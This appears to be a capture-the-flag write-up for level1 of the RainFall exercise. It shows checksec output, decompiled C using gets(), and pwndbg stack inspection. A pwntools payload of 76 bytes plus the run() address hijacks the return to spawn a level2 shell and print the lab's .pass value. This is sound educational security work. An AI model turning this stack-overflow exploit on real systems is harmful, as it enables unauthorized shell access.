@@ -1,0 +1,113 @@
+When we change to level1 user, we're greeted with:
+
+```shell
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   69 Symbols        No    0               1               level1
+```
+
+We find another SUID executable, this time owned by level2.
+
+```shell
+level1@RainFall:~$ ls -l
+total 8
+-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1
+```
+
+When running it, it takes input and does nothing.
+
+```shell
+level1@RainFall:~$ ./level1
+42
+```
+Copying it over and decompiling.
+
+```shell
+┌──(kali㉿kali)-[~]
+└─$ scp -P 4242 level1@192.168.64.3:/home/user/level1/level1 .
+          _____       _       ______    _ _ 
+         |  __ \     (_)     |  ____|  | | |
+         | |__) |__ _ _ _ __ | |__ __ _| | |
+         |  _  /  _` | | '_ \|  __/ _` | | |
+         | | \ \ (_| | | | | | | | (_| | | |
+         |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|
+
+                 Good luck & Have fun
+
+  To start, ssh with level0/level0 on 192.168.64.3:4242
+level1@192.168.64.3's password: 
+level1                                                                                                                    100% 5138   847.7KB/s   00:00 
+```
+
+<img width="1440" alt="Screenshot 2023-05-24 at 18 20 39" src="https://github.com/hennneh/rainfall/assets/70098821/d9ed5534-2277-467c-97f8-49e56f535114">
+
+The decompiled code looks like this:
+
+```C
+void main(void)
+{
+    undefined auStack80 [76];
+    
+    gets(auStack80);
+    return;
+}
+
+void run(void)
+{
+    fwrite("Good... Wait what?\n", 1, 0x13, _stdout);
+    system("/bin/sh");
+    return;
+}
+```
+
+The ``gets`` function has a security vulnerability that lets us overflow the buffer. This allows us to overwrite the ``ret`` with the ``run`` function.
+
+![image](https://github.com/hennneh/rainfall/assets/50553280/e8daa585-338a-416d-83a6-d2a5ad1d3028)
+
+Through the decompiled code we found the address of the ``run`` function at ``0x08048444`` and because of ``No PIE`` we don't need to worry about the address changing
+
+```shell
+pwndbg> stack 50
+00:0000│ esp 0xffffcbe0 —▸ 0xffffcbf0 ◂— 'AAAA'
+[...]
+... ↓        3 skipped
+15:0054│     0xffffcc34 ◂— 0x70 /* 'p' */
+16:0058│ ebp 0xffffcc38 ◂— 0x0
+17:005c│     0xffffcc3c —▸ 0xf7da4295 (__libc_start_call_main+117) ◂— add esp, 0x10
+```
+
+As we can see on the stack of the program, our input is stored at ``0xffffcbf0`` and we need to overwrite address at ``0xffffcc3c`` to the run function address. So we need to fill up the buffer 76 chars to get to the ret address.
+
+```python
+p.sendline(b"A"*76 + p32(elf.sym.run))
+```
+
+So we wrote our payload using pwntools framework in python. The payload consists of 76 chars and the address of ``run`` function.
+
+After sending the payload, we spawned a shell as user level2 which allows us to read the ``.pass`` file in the user level2 home directory.
+
+```shell
+┌──(yuerino㉿yuerino-laptop)-[~/rainfall/level1]
+└─$ python3 script.py SSH
+[*] '/home/yuerino/rainfall/level1/level1'
+    Arch:     i386-32-little
+    RELRO:    No RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x8048000)
+    RWX:      Has RWX segments
+[+] Connecting to 192.168.184.128 on port 4242: Done
+[*] level1@192.168.184.128:
+    Distro    Ubuntu 12.04
+    OS:       linux
+    Arch:     i386
+    Version:  3.2.0
+    ASLR:     Disabled
+    Note:     Susceptible to ASLR ulimit trick (CVE-2016-3672)
+[+] Starting remote process bytearray(b'./level1') on 192.168.184.128: pid 4760
+[*] Switching to interactive mode
+Good... Wait what?
+$ $ whoami
+level2
+$ $ cat /home/user/level2/.pass
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+```
